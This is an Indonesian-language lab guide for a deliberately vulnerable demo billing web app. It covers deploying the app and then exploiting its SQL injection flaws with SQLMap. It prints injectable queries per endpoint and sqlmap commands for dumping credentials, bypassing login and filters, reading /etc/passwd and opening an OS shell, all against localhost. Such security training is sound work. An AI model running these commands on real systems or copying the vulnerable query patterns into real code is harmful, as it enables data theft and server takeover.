# Deploy Web & SQL Injection dengan SQLMap

> ⚠️ **Hanya untuk pembelajaran.**
> Proyek ini dibuat murni sebagai bahan latihan keamanan web. Ini **bukan** aplikasi resmi, **bukan** produk, dan **tidak berafiliasi** dengan perusahaan mana pun. Semua nama, data, dan kredensial di sini adalah contoh/fiktif. Jangan dipakai di produksi maupun untuk aktivitas ilegal.

Dokumen ini menjelaskan dua hal:

1. **Deploy aplikasi** demo PDAM (Node.js + MySQL) — lewat Docker Compose atau manual.
2. **Eksploitasi celah SQL Injection** di aplikasi tersebut memakai [SQLMap](https://sqlmap.org/).

Aplikasi sengaja dibuat rentan. Detail celah per endpoint (beserta payload manual) ada di [`README.md`](README.md); dokumen ini fokus ke cara menjalankan dan mengotomatiskan pengujiannya.

---

## Daftar Isi

- [Teknologi](#teknologi)
- [Bagian 1 — Deploy Web](#bagian-1--deploy-web)
  - [1.1 Prasyarat](#11-prasyarat)
  - [1.2 Deploy dengan Docker Compose](#12-deploy-dengan-docker-compose)
  - [1.3 Deploy Manual](#13-deploy-manual)
  - [1.4 Akun Demo](#14-akun-demo)
  - [1.5 Daftar Endpoint](#15-daftar-endpoint)
- [Bagian 2 — SQL Injection dengan SQLMap](#bagian-2--sql-injection-dengan-sqlmap)
  - [2.1 Apa itu SQLMap?](#21-apa-itu-sqlmap)
  - [2.2 Parameter Dasar](#22-parameter-dasar)
  - [2.3 Teknik Injeksi](#23-teknik-injeksi)
  - [2.4 Praktik per Endpoint](#24-praktik-per-endpoint)
  - [2.5 Teknik Lanjutan](#25-teknik-lanjutan)
  - [2.6 Ringkasan Perintah Cepat](#26-ringkasan-perintah-cepat)
  - [2.7 Matrix Endpoint vs Teknik](#27-matrix-endpoint-vs-teknik)
  - [2.8 Troubleshooting](#28-troubleshooting)
  - [2.9 Best Practices](#29-best-practices)

---

## Teknologi

| Komponen | Teknologi |
|----------|-----------|
| Backend | Node.js 22 + Express 4 |
| Database | MySQL 8.0 |
| View Engine | EJS |
| Container | Docker + Docker Compose |

---

# Bagian 1 — Deploy Web

## 1.1 Prasyarat

| Tools | Versi Minimal | Cek |
|-------|---------------|-----|
| Node.js | 18.x | `node -v` |
| npm | 9.x | `npm -v` |
| MySQL | 8.0 | `mysql --version` |
| Docker (opsional) | 24.x | `docker -v` |
| Docker Compose (opsional) | 2.x | `docker compose version` |

---

## 1.2 Deploy dengan Docker Compose

Cara paling praktis — MySQL dan aplikasi disiapkan sekaligus, termasuk inisialisasi database dari `db/init.sql`.

### Langkah

```bash
# 1. Masuk ke direktori proyek
cd latihan-sqli

# 2. Build & jalankan
#    - db  : MySQL 8.0, init.sql dijalankan otomatis
#    - app : Node.js, menunggu database sehat
docker compose up -d
```

### Yang berjalan

| Container | Port | Deskripsi |
|-----------|------|-----------|
| `pdam-mysql` | 3306 | MySQL dengan database `pdam_db`, tabel & seed sudah terisi |
| `pdam-app` | 3000 | Aplikasi Express, otomatis konek ke MySQL lewat `DB_HOST=db` |

### Verifikasi

```bash
# Cek status container
docker compose ps

# Lihat log aplikasi
docker compose logs -f app

# Cek dari luar
curl http://localhost:3000
# → harus mengembalikan landing page
```

### Menghentikan

```bash
docker compose down          # hentikan container
docker compose down -v       # hentikan + hapus volume (data MySQL ikut hilang)
```

---

## 1.3 Deploy Manual

Tanpa Docker, butuh MySQL 8.0 yang sudah berjalan di mesin lokal.

### 1.3.1 Siapkan Database

```bash
# Masuk ke MySQL
mysql -u root -p

# Jalankan skema + seed
mysql -u root -p < db/init.sql
```

Perintah ini membuat:

- Database `pdam_db`
- Tabel `users`, `customers`, `bills`
- Seed: 3 user, 10 pelanggan, 18 tagihan

### 1.3.2 Install Dependensi

```bash
npm install
```

### 1.3.3 Konfigurasi Environment

Buat file `.env` di root proyek:

```env
DB_HOST=localhost
DB_PORT=3306
DB_USER=root
DB_PASSWORD=root
DB_NAME=pdam_db
PORT=3000
SESSION_SECRET=supersecretkey123
```

> Sesuaikan `DB_USER` dan `DB_PASSWORD` dengan MySQL lokalmu. Semua nilai punya default, jadi `.env` bersifat opsional.

### 1.3.4 Jalankan Aplikasi

```bash
node app.js
# → http://localhost:3000
```

### 1.3.5 Verifikasi

```bash
# Landing page
curl http://localhost:3000

# Login API — ambil token
curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | jq .
```

---

## 1.4 Akun Demo

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | admin |
| `operator1` | `op12345` | operator |
| `manager` | `manager123` | manager |

---

## 1.5 Daftar Endpoint

Kolom **Rentan** menandai apakah endpoint mengandung celah SQL Injection.

### Halaman Web (HTML)

Halaman memakai autentikasi **session cookie**. Selain `/` dan `/login`, semua butuh login.

| Method | Endpoint | Auth | Rentan | Keterangan |
|--------|----------|------|:------:|------------|
| `GET` | `/` | ❌ | ✅ | Landing page + cek tagihan (`?no_sambung=`) |
| `GET` | `/login` | ❌ | ❌ | Form login |
| `POST` | `/login` | ❌ | ✅ | Proses login, buat session |
| `GET` | `/logout` | ❌ | ❌ | Hapus session |
| `GET` | `/dashboard` | Session | ❌ | Dashboard statistik |
| `GET` | `/customers` | Session | ✅ | Daftar & cari pelanggan (`?search=`) |
| `GET` | `/customer/:id` | Session | ✅ | Detail pelanggan |
| `GET` | `/customer/:id/edit` | Session | ✅ | Form edit pelanggan |
| `POST` | `/customer/:id/edit` | Session | ✅ | Simpan perubahan pelanggan |
| `GET` | `/bill/:id` | Session | ✅ | Detail tagihan |
| `GET` | `/bill/:id/pay` | Session | ✅ | Halaman pembayaran |
| `POST` | `/bill/:id/pay` | Session | ✅ | Proses pembayaran |
| `GET` | `/meter` | Session | ❌ | Form input meter bulanan |
| `POST` | `/meter` | Session | ✅ | Simpan tagihan baru |
| `GET` | `/export` | Session | ✅ | Export tabel (`?table=`) |

### REST API (JSON)

API memakai autentikasi **Bearer token**. Selain `/api/login` dan `/api/cek-tagihan`, semua butuh header `Authorization: Bearer <token>`.

| Method | Endpoint | Auth | Rentan | Keterangan |
|--------|----------|------|:------:|------------|
| `POST` | `/api/login` | ❌ | ✅ | Login, dapat token |
| `POST` | `/api/logout` | Token | ❌ | Hapus token |
| `GET` | `/api/customers` | Token | ✅ | Daftar & cari pelanggan (`?search=`) |
| `GET` | `/api/customers/:id` | Token | ✅ | Detail pelanggan |
| `PUT` | `/api/customers/:id` | Token | ✅ | Update data pelanggan |
| `GET` | `/api/bills/:id` | Token | ✅ | Detail tagihan |
| `PUT` | `/api/bills/:id/pay` | Token | ✅ | Bayar tagihan |
| `GET` | `/api/export` | Token | ✅ | Export tabel (`?table=`) |
| `GET` | `/api/cek-tagihan` | ❌ | ✅ | Cek tagihan publik (`?no_sambung=`) |
| `POST` | `/api/meter` | Token | ✅ | Input meter bulanan |

> 🔑 Login halaman lewat `POST /login` → session otomatis ter-set.
> 🔑 Login API lewat `POST /api/login` → dapat token → kirim `Authorization: Bearer <token>`.

---

# Bagian 2 — SQL Injection dengan SQLMap

## 2.1 Apa itu SQLMap?

SQLMap adalah tool otomatis untuk menguji SQL Injection, open-source. Kemampuannya:

- Mendeteksi ada/tidaknya celah SQLi
- Mengekstrak database, tabel, dan kolom
- Mendump isi data
- Membaca file sistem (jika akun database punya `FILE` privilege)
- Menjalankan perintah OS (jika kondisi memungkinkan)

### Instalasi

```bash
# Arch Linux
sudo pacman -S sqlmap

# Debian/Ubuntu
sudo apt install sqlmap

# macOS
brew install sqlmap

# Via pip (semua OS)
pip install sqlmap

# Cek
sqlmap --version
```

---

## 2.2 Parameter Dasar

| Parameter | Fungsi |
|-----------|--------|
| `-u <URL>` | Target URL |
| `--data <data>` | Body untuk request POST |
| `-p <param>` | Parameter yang diuji (default: semua) |
| `--method <method>` | HTTP method (GET/POST/PUT) |
| `--cookie <cookie>` | Kirim cookie/session |
| `-H <header>` | Header tambahan, mis. `-H "Authorization: Bearer tok_1"` |
| `--headers 'h1: v1\nh2: v2'` | Beberapa header sekaligus (dipisah newline) |
| `--level <1-5>` | Intensitas pengujian (default 1) |
| `--risk <1-3>` | Tingkat risiko (default 1) |
| `--batch` | Jawab otomatis, non-interaktif |
| `--flush-session` | Hapus cache session |
| `--threads <n>` | Jumlah thread (default 1, maks 10) |
| `--time-sec <n>` | Timeout untuk time-based (default 5) |

### Enumeration

| Parameter | Fungsi |
|-----------|--------|
| `--dbs` | Daftar semua database |
| `-D <db>` | Pilih database target |
| `--tables` | Daftar tabel di database |
| `-T <table>` | Pilih tabel target |
| `--columns` | Daftar kolom di tabel |
| `-C <col1,col2>` | Pilih kolom target |
| `--dump` | Dump data |
| `--dump-all` | Dump semua data dari semua tabel |

---

## 2.3 Teknik Injeksi

SQLMap memilih teknik secara otomatis, atau bisa dipaksa lewat `--technique`:

| Teknik | Kode | Cara Kerja |
|--------|------|------------|
| Boolean-based blind | `B` | Bandingkan respons TRUE/FALSE |
| Error-based | `E` | Memicu error database untuk menarik info |
| UNION query | `U` | Gabungkan hasil lewat `UNION SELECT` |
| Stacked queries | `S` | Jalankan query tambahan setelah query utama |
| Time-based blind | `T` | Tunda respons lewat `SLEEP`/`WAITFOR` |
| Inline queries | `Q` | Sisipkan subquery langsung di parameter |

Default: `BEUSTQ` (semua teknik). Contoh filter: `--technique=BEU`.

---

## 2.4 Praktik per Endpoint

> **Penting:** setiap endpoint punya konteks injeksi yang berbeda. SQLMap mendeteksi tipe injeksi dan memilih teknik terbaiknya sendiri.

Contoh di bawah memakai `$TOKEN` untuk endpoint yang butuh auth. Isi dulu dengan:

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')
```

---

### 2.4.1 Cek Tagihan Publik (tanpa auth)

**Endpoint:** `GET /api/cek-tagihan?no_sambung=`

**Query rentan:**

```sql
SELECT b.*, c.nama, c.alamat, c.kecamatan
FROM bills b JOIN customers c ON b.customer_id = c.id
WHERE c.no_sambung = '${no_sambung}'
```

**Perintah:**

```bash
# Deteksi otomatis
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch

# Daftar database
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch --dbs
# → information_schema, mysql, performance_schema, pdam_db, sys

# Dump tabel users
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch \
  -D pdam_db -T users --dump

# Dump seluruh database
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch \
  -D pdam_db --dump-all
```

**Hasil:**

```
Database: pdam_db
Table: users
+----+-----------+-----------+----------+---------------------+
| id | username  | password  | role     | nama_lengkap        |
+----+-----------+-----------+----------+---------------------+
| 1  | admin     | admin123  | admin    | Admin Utama PDAM    |
| 2  | operator1 | op12345   | operator | Bambang Supriyadi   |
| 3  | manager   | manager123| manager  | Siti Rahmawati      |
+----+-----------+-----------+----------+---------------------+
```

---

### 2.4.2 Landing Page (view, tanpa auth)

**Endpoint:** `GET /?no_sambung=`

Sama seperti cek tagihan publik, bedanya respons berupa HTML.

```bash
sqlmap -u 'http://localhost:3000/?no_sambung=TA2023001' --batch --dbs
```

---

### 2.4.3 Login Bypass

**Endpoint:** `POST /login` (view) dan `POST /api/login` (JSON)

**Query rentan:**

```sql
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'
```

**Perintah:**

```bash
# Login view (form-urlencoded)
sqlmap -u 'http://localhost:3000/login' \
  --data 'username=admin&password=admin123' --batch

# Login API (JSON)
sqlmap -u 'http://localhost:3000/api/login' \
  --data '{"username":"admin","password":"admin123"}' \
  --headers 'Content-Type: application/json' --batch
```

SQLMap mendeteksi bahwa `username` bisa di-inject, sehingga bisa login sebagai user mana pun tanpa tahu password.

---

### 2.4.4 Search Customer (GET, dengan auth)

**Endpoint:** `GET /api/customers?search=`

**Query rentan:**

```sql
SELECT * FROM customers WHERE nama LIKE '%${search}%' OR no_sambung LIKE '%${search}%'
```

**Perintah:**

```bash
sqlmap -u 'http://localhost:3000/api/customers?search=ahmad' \
  -H "Authorization: Bearer $TOKEN" \
  --batch -p search --dbs
```

---

### 2.4.5 Customer Detail (parameter di path)

**Endpoint:** `GET /api/customers/:id`

**Query rentan:**

```sql
SELECT * FROM customers WHERE id = ${id}
```

**Perintah** — tanda `*` menandai posisi yang diuji:

```bash
sqlmap -u 'http://localhost:3000/api/customers/1*' \
  -H "Authorization: Bearer $TOKEN" \
  --batch --dbs
```

---

### 2.4.6 Bill Detail (parameter di path)

**Endpoint:** `GET /api/bills/:id`

**Query rentan:**

```sql
SELECT b.*, c.nama, c.no_sambung FROM bills b
JOIN customers c ON b.customer_id = c.id WHERE b.id = ${id}
```

**Perintah:**

```bash
sqlmap -u 'http://localhost:3000/api/bills/1*' \
  -H "Authorization: Bearer $TOKEN" \
  --batch --dbs
```

---

### 2.4.7 Pay Bill (PUT, parameter di path)

**Endpoint:** `PUT /api/bills/:id/pay`

**Query rentan:**

```sql
UPDATE bills SET status_bayar='lunas', tgl_bayar=CURDATE() WHERE id = ${id}
```

**Perintah** — perlu `--method PUT`:

```bash
sqlmap -u 'http://localhost:3000/api/bills/1/pay*' \
  --method PUT \
  -H "Authorization: Bearer $TOKEN" \
  --batch
```

---

### 2.4.8 Export Table (parameter query string)

**Endpoint:** `GET /api/export?table=`

**Query rentan:**

```sql
SELECT * FROM ${table}
```

**Perintah:**

```bash
sqlmap -u 'http://localhost:3000/api/export?table=customers' \
  -H "Authorization: Bearer $TOKEN" \
  --batch -p table --dbs
```

---

### 2.4.9 Input Meter Bulanan (POST JSON, dengan auth)

**Endpoint:** `POST /api/meter`

Body: `{"customer_id":1, "bulan":10, "tahun":2026, "pemakaian_m3":30}`

**Query rentan:**

```sql
INSERT INTO bills (customer_id, bulan, tahun, pemakaian_m3, tagihan, status_bayar)
SELECT ${customer_id}, ${bulan}, ${tahun}, ${pemakaian_m3},
       ${pemakaian_m3} * tarif_per_m3, 'belum'
FROM customers WHERE id = ${customer_id}
```

Semua parameter numerik ditempel langsung — `pemakaian_m3` bahkan bisa berisi subquery.

**Perintah:**

```bash
sqlmap -u 'http://localhost:3000/api/meter' \
  --method POST \
  --data '{"customer_id":1,"bulan":10,"tahun":2026,"pemakaian_m3":30}' \
  --headers 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  --batch -p pemakaian_m3 --dump
```

---

## 2.5 Teknik Lanjutan

### 2.5.1 Bypass WAF / Filter

```bash
# Tamper script — lewati filter umum
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --tamper=space2comment --batch

# Encode string sebagai hex
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --hex --batch
```

### 2.5.2 Baca File Sistem (`LOAD_FILE`)

```bash
# Baca /etc/passwd (butuh FILE privilege)
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --file-read='/etc/passwd' --batch
```

### 2.5.3 OS Shell

```bash
# Butuh hak tulis file (mis. SELECT ... INTO OUTFILE)
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --os-shell --batch
```

### 2.5.4 Batch Non-interaktif dengan Output File

```bash
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --batch -D pdam_db --dump-all \
  --output-dir=./sqlmap-results
```

---

## 2.6 Ringkasan Perintah Cepat

### Endpoint publik — deteksi + dump semuanya

```bash
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --batch --dump-all --threads=5 -o
```

### Endpoint dengan auth

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

sqlmap -u 'http://localhost:3000/api/customers?search=ahmad' \
  -H "Authorization: Bearer $TOKEN" \
  -p search --batch -D pdam_db -T users --dump
```

---

## 2.7 Matrix Endpoint vs Teknik

| Endpoint | Auth | Method | Parameter | Teknik Terbaik | Catatan |
|----------|------|--------|-----------|----------------|---------|
| `/api/cek-tagihan` | ❌ | GET | `no_sambung` | UNION, Time-based | Read-only |
| `/` | ❌ | GET | `no_sambung` | UNION, Time-based | Read-only |
| `/api/login` | ❌ | POST | `username`, `password` | Boolean, Error-based | Read-only, publik |
| `/login` | ❌ | POST | `username`, `password` | Boolean, Error-based | Read-only, publik |
| `/api/customers` | Token | GET | `search` | UNION, Time-based | Perlu token |
| `/api/customers/:id` | Token | GET | `id` (path) | UNION, Time-based | Perlu token |
| `/api/bills/:id` | Token | GET | `id` (path) | Time-based | UNION berisiko error |
| `/api/bills/:id/pay` | Token | PUT | `id` (path) | Time-based | **Ubah data** |
| `/api/export` | Token | GET | `table` | UNION, Time-based | Read-only |
| `/api/meter` | Token | POST | `customer_id`, `bulan`, `tahun`, `pemakaian_m3` | Boolean, Time-based | **Tambah data** |
| `/customer/:id/edit` | Session | POST | `nama`, `alamat`, dll. | Boolean, Time-based | **Ubah data** |
| `/bill/:id/pay` | Session | POST | `id` (path) | Time-based | **Ubah data** |
| `/meter` | Session | POST | `customer_id`, `bulan`, `tahun`, `pemakaian_m3` | Boolean, Time-based | **Tambah data** |

> ⚠️ Endpoint `UPDATE`/`INSERT` akan **mengubah data asli** saat diuji. Backup database dulu, atau latihan di endpoint `GET` yang hanya membaca.

---

## 2.8 Troubleshooting

### "No parameter found"

Paksa pengujian parameter dengan menambahkan `*`:

```bash
sqlmap -u 'http://localhost:3000/api/customers?search=ahmad*' \
  -H "Authorization: Bearer $TOKEN" --batch
```

### Body JSON tidak terbaca

Beri tahu SQLMap header `Content-Type`:

```bash
sqlmap -u 'http://localhost:3000/api/login' \
  --data '{"username":"admin","password":"admin123"}' \
  --headers 'Content-Type: application/json' --batch
```

### Time-based terlalu lambat

```bash
# Perpendek jeda
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --time-sec 2 --batch

# Atau lewati time-based
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --technique=BEU --batch
```

### Hasil lama terbawa (cache)

```bash
sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
  --flush-session --batch
```

---

## 2.9 Best Practices

1. Pakai endpoint publik (`/api/cek-tagihan`) untuk latihan bebas repot auth dan tanpa risiko mengubah data.
2. **Backup database** sebelum menguji endpoint `UPDATE`/`INSERT`.
3. Selalu pakai `--batch` agar tidak perlu interaksi manual.
4. Mulai dengan `--technique=BEU` (tanpa time-based) untuk deteksi cepat.
5. Pakai `--threads=5` untuk mempercepat ekstraksi data besar.
6. Simpan hasil dengan `--output-dir=./sqlmap-output`.

---

> ⚠️ Seluruh isi dokumen ini untuk lingkungan lab/pembelajaran. Jangan digunakan pada sistem yang bukan milikmu atau tanpa izin.
